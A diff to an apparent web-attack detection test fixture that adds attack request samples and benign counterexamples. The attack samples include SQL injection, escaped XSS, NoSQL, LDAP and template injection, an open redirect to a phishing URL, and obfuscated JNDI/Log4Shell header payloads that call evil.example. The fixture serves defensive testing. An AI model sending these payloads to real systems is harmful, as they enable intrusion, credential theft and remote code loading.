@@ -15,7 +15,11 @@
         {"scenario": "nosql_injection", "path": "/users?name%5B%24ne%5D=admin"},
         {"scenario": "ldap_injection", "path": "/directory?user=admin%29%28%7C%28uid%3D%2A%29%29"},
         {"scenario": "ssti", "path": "/preview?name=%7B%7B7%2A7%7D%7D"},
-        {"scenario": "open_redirect", "path": "/login?redirect=https://evil.example/phish"}
+        {"scenario": "open_redirect", "path": "/login?redirect=https://evil.example/phish"},
+        {"scenario": "sql_injection", "path": "/search?q=1%20UNION/**/SELECT%20password"},
+        {"scenario": "xss", "path": "/search?q=%u003cscript%u003ealert(1)%u003c/script%u003e"},
+        {"scenario": "jndi_injection", "path": "/", "headers": {"X-Api-Version": "${jndi:ldap://evil.example/a}"}},
+        {"scenario": "jndi_injection", "path": "/", "headers": {"User-Agent": "${${lower:j}ndi:ldap://evil.example/a}"}}
     ],
     "benign": [
         {"path": "/"},
@@ -37,6 +41,9 @@
         {"path": "/images/logo.svg"},
         {"path": "/admin/reports"},
         {"path": "/api/v1/users/42"},
-        {"path": "/locale?id=en_US"}
+        {"path": "/locale?id=en_US"},
+        {"path": "/", "headers": {"Origin": "http://localhost:3000", "X-Requested-With": "XMLHttpRequest"}},
+        {"path": "/search?q=%24%7Bname%7D%20template%20placeholder"},
+        {"path": "/notes", "method": "POST", "content_type": "application/json", "content": "{\"body\":\"see /* note */ below\"}"}
     ]
 }
